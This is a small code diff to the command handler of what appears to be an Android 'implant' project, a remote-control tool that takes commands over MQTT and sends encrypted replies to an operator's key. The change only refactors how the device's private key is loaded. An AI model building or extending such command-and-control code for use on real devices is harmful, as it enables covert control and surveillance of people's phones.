@@ -3,6 +3,7 @@ package com.cooperthecoder.implant.command
 import android.content.Context
 import android.util.Log
 import com.cooperthecoder.implant.Config
+import com.cooperthecoder.implant.crypto.Base64KeyPair
 import com.cooperthecoder.implant.crypto.NetworkEncryption
 import com.cooperthecoder.implant.data.DeviceProperties
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
@@ -112,9 +113,10 @@ class CommandHandler(context: Context, val client: MqttAndroidClient) {
                 .build()
 
         val message = MqttMessage()
+        val privateKey = Base64KeyPair(SharedPreferencesQuery.getPrivateKey(context)).privateKeyBase64()
         val networkEncryption = NetworkEncryption(
                 Config.OPERATOR_PUBLIC_KEY,
-                SharedPreferencesQuery.getPrivateKey(context)
+                privateKey
         )
         message.payload = reply.json(networkEncryption).toByteArray()
         client.publish(DeviceProperties.replyChannelName(context), message)
